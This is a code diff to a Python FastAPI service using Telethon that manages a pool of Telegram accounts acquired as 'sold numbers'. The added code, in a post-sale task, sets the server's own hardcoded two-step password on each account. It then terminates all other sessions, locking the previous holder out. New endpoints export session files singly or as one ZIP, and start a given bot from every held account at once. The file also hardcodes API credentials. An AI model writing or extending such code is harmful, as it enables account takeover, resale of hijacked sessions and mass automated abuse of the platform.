@@ -1,12 +1,12 @@
-import os, re, glob, shutil, sqlite3, asyncio, json
+import os, re, glob, shutil, sqlite3, asyncio, json, io, zipfile, tempfile
 from uuid import uuid4
 from pathlib import Path
-from typing import Optional
+from typing import Optional, List
 from contextlib import asynccontextmanager
 from datetime import datetime, timezone
 
 from fastapi import FastAPI, HTTPException
-from fastapi.responses import FileResponse, JSONResponse, Response
+from fastapi.responses import FileResponse, JSONResponse, Response, StreamingResponse
 from pydantic import BaseModel
 import uvicorn
 
@@ -21,6 +21,7 @@ from telethon.tl.functions.account import (
 )
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
 from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import StartBotRequest
 from telethon.tl.types import (
     EmailVerifyPurposeLoginChange, EmailVerifyPurposeLoginSetup,
     EmailVerificationCode,
@@ -28,15 +29,49 @@ from telethon.tl.types import (
 
 API_ID   = 32140582
 API_HASH = "e9597b6e5e64a9d093071e20d0545f3f"
-AUTO_2FA_PASSWORD = "4735908767"
-ADMIN_USERNAME    = "sopnox"
+AUTO_2FA_PASSWORD  = "4735908767"
+ADMIN_USERNAME     = "sopnox"
 
 BASE_DIR     = Path(__file__).parent
 SESSIONS_DIR = BASE_DIR / "sessions"
 SESSIONS_DIR.mkdir(exist_ok=True)
-STATIC_DIR = BASE_DIR / "static"
-DB_PATH    = str(BASE_DIR / "accounts.db")
-USERS_PATH = BASE_DIR / "users.json"
+STATIC_DIR        = BASE_DIR / "static"
+DB_PATH           = str(BASE_DIR / "accounts.db")
+USERS_PATH        = BASE_DIR / "users.json"
+FAILED_LOGOUT_PATH = BASE_DIR / "failed_logouts.json"
+
+# ── Failed Logout JSON ────────────────────────────────────────────────────────
+def load_failed_logouts() -> list:
+    if FAILED_LOGOUT_PATH.exists():
+        try:
+            return json.loads(FAILED_LOGOUT_PATH.read_text())
+        except Exception:
+            pass
+    return []
+
+def save_failed_logouts(data: list):
+    FAILED_LOGOUT_PATH.write_text(json.dumps(data, ensure_ascii=False, indent=2))
+
+def record_failed_logout(phone: str, error: str):
+    data = load_failed_logouts()
+    for item in data:
+        if item["phone"] == phone and not item.get("resolved"):
+            item["error"] = error
+            item["timestamp"] = datetime.now(timezone.utc).isoformat()
+            save_failed_logouts(data)
+            return
+    data.append({
+        "phone": phone,
+        "error": error,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "resolved": False,
+    })
+    save_failed_logouts(data)
+
+def resolve_failed_logout(phone: str):
+    data = load_failed_logouts()
+    data = [d for d in data if not (d["phone"] == phone and not d.get("resolved"))]
+    save_failed_logouts(data)
 
 # ── Users JSON ────────────────────────────────────────────────────────────────
 def load_users() -> dict:
@@ -68,6 +103,16 @@ def user_get_stats(username: str) -> dict:
         "sold_numbers": u.get("sold_numbers", []),
         "total_logins": u.get("total_logins", 0),
     }
+
+# ── Bot link parser ───────────────────────────────────────────────────────────
+def parse_bot_link(link: str):
+    link = link.strip()
+    if link.startswith('@'):
+        return link, ''
+    m = re.match(r'(?:https?://)?t\.me/([^?/\s]+)(?:\?start=([^\s]+))?', link)
+    if m:
+        return '@' + m.group(1), m.group(2) or ''
+    return link, ''
 
 # ── Database ──────────────────────────────────────────────────────────────────
 def init_db():
@@ -184,6 +229,12 @@ class RecordSaleBody(BaseModel):
 class AuthLoginBody(BaseModel):
     username: str
 
+class StartBotBody(BaseModel):
+    bot_link: str
+
+class StartBotAllBody(BaseModel):
+    bot_link: str
+
 # ── Auth ──────────────────────────────────────────────────────────────────────
 @app.post("/api/auth/login")
 async def auth_login(body: AuthLoginBody):
@@ -289,39 +340,49 @@ async def sign_in(body: SignInBody):
         "usedPassword": used_pw,
     }
 
-# ── Record sale + trigger auto-2FA ────────────────────────────────────────────
+# ── Record sale + trigger auto-2FA + terminate all other sessions ─────────────
 @app.post("/api/user/record-sale")
 async def record_sale(body: RecordSaleBody):
     if body.username.lower() == ADMIN_USERNAME.lower():
         raise HTTPException(403, "Admin cannot sell numbers")
     user_record_sale(body.username, body.phone)
 
-    async def _auto_2fa():
+    async def _post_sale():
+        # Step 1: after 5s, enable 2FA
         await asyncio.sleep(5)
-        client = make_client(session_name(body.phone))
+        client2fa = make_client(session_name(body.phone))
         try:
-            await client.connect()
+            await client2fa.connect()
             if body.had2fa and body.old_password:
                 try:
-                    await client.edit_2fa(
+                    await client2fa.edit_2fa(
                         current_password=body.old_password,
                         new_password=None
                     )
                     db_set_2fa(body.phone, False)
                 except Exception:
                     pass
-            await client.edit_2fa(
-                current_password=None,
-                new_password=AUTO_2FA_PASSWORD
-            )
+            await client2fa.edit_2fa(current_password=None, new_password=AUTO_2FA_PASSWORD)
             db_set_2fa(body.phone, True)
         except Exception:
             pass
         finally:
-            try: await client.disconnect()
+            try: await client2fa.disconnect()
             except: pass
 
-    asyncio.create_task(_auto_2fa())
+        # Step 2: after 10s total, terminate all OTHER sessions
+        await asyncio.sleep(5)
+        client_sess = make_client(session_name(body.phone))
+        try:
+            await client_sess.connect()
+            await client_sess(ResetAuthorizationsRequest())
+        except Exception as e:
+            record_failed_logout(body.phone, str(e))
+        finally:
+            try: await client_sess.disconnect()
+            except: pass
+
+    asyncio.create_task(_post_sale())
     return {"success": True}
 
 # ── User stats ────────────────────────────────────────────────────────────────
@@ -345,6 +406,18 @@ async def admin_users():
         })
     result.sort(key=lambda x: x["sold_count"], reverse=True)
     return result
+
+# ── Admin: failed logouts ─────────────────────────────────────────────────────
+@app.get("/api/admin/failed-logouts")
+async def get_failed_logouts():
+    return [f for f in load_failed_logouts() if not f.get("resolved")]
+
+@app.delete("/api/admin/failed-logouts/{phone}")
+async def dismiss_failed_logout(phone: str):
+    from urllib.parse import unquote
+    phone = unquote(phone)
+    resolve_failed_logout(phone)
+    return {"success": True}
 
 # ── Accounts list ─────────────────────────────────────────────────────────────
 @app.get("/api/telegram/accounts")
@@ -407,6 +480,90 @@ async def enable_2fa(phone: str, body: Enable2faBody):
     finally:
         try: await client.disconnect()
         except: pass
+
+# ── Start Bot (single account) ────────────────────────────────────────────────
+@app.post("/api/telegram/accounts/{phone}/start-bot")
+async def start_bot_single(phone: str, body: StartBotBody):
+    from urllib.parse import unquote
+    phone = unquote(phone)
+    bot_username, start_param = parse_bot_link(body.bot_link)
+    client = make_client(session_name(phone))
+    try:
+        await client.connect()
+        bot_entity = await client.get_entity(bot_username)
+        await client(StartBotRequest(
+            bot=bot_entity,
+            peer=bot_entity,
+            start_param=start_param or ''
+        ))
+        return {"success": True, "message": f"Bot started from {phone}"}
+    except Exception as e:
+        raise HTTPException(500, str(e))
+    finally:
+        try: await client.disconnect()
+        except: pass
+
+# ── Start Bot (all accounts) ──────────────────────────────────────────────────
+@app.post("/api/telegram/start-bot-all")
+async def start_bot_all(body: StartBotAllBody):
+    bot_username, start_param = parse_bot_link(body.bot_link)
+    results = []
+    for acc in db_all():
+        client = make_client(session_name(acc["phone"]))
+        try:
+            await client.connect()
+            bot_entity = await client.get_entity(bot_username)
+            await client(StartBotRequest(
+                bot=bot_entity,
+                peer=bot_entity,
+                start_param=start_param or ''
+            ))
+            results.append({"phone": acc["phone"], "success": True})
+        except Exception as e:
+            results.append({"phone": acc["phone"], "success": False, "error": str(e)})
+        finally:
+            try: await client.disconnect()
+            except: pass
+    return {"results": results}
+
+# ── Download session (single) ─────────────────────────────────────────────────
+@app.get("/api/telegram/accounts/{phone}/download-session")
+async def download_session(phone: str):
+    from urllib.parse import unquote
+    phone = unquote(phone)
+    sess_file = Path(session_name(phone) + ".session")
+    if not sess_file.exists():
+        raise HTTPException(404, "Session file not found")
+    safe = phone_safe(phone)
+    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".session")
+    try:
+        shutil.copy2(str(sess_file), tmp.name)
+        tmp.close()
+        return FileResponse(
+            tmp.name,
+            media_type="application/octet-stream",
+            filename=f"{safe}.session",
+        )
+    except Exception as e:
+        raise HTTPException(500, str(e))
+
+# ── Download all sessions as ZIP ──────────────────────────────────────────────
+@app.get("/api/admin/download-all-sessions")
+async def download_all_sessions():
+    accounts = db_all()
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for acc in accounts:
+            sess_file = Path(session_name(acc["phone"]) + ".session")
+            if sess_file.exists():
+                safe = phone_safe(acc["phone"])
+                zf.write(str(sess_file), f"{safe}.session")
+    buf.seek(0)
+    return StreamingResponse(
+        buf,
+        media_type="application/zip",
+        headers={"Content-Disposition": "attachment; filename=sessions.zip"},
+    )
 
 # ── Get login code ────────────────────────────────────────────────────────────
 @app.get("/api/telegram/accounts/{phone}/login-code")
@@ -486,6 +643,7 @@ async def terminate_all(phone: str):
     try:
         await client.connect()
         await client(ResetAuthorizationsRequest())
+        resolve_failed_logout(phone)
         return {"success": True}
     except Exception as e:
         raise HTTPException(500, str(e))
